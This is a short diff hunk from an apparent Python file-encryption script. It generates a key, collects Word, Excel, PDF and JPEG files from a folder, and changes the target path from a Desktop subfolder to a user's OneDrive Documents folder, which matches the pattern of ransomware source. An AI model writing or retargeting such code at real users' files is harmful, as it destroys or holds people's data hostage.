@@ -33,7 +33,7 @@ def encrypt(file_in_bytes, key):
 
 def main():
     key = gen_key()
-    mypath = r"C:\Users\halo-\Desktop\Weas"
+    mypath = r"C:\Users\hdext\OneDrive\Documentos"
     extensions = [".docx",".xlsx", ".pdf", ".jpeg", ".jpg"]
     files = []
     for f in listdir(mypath):
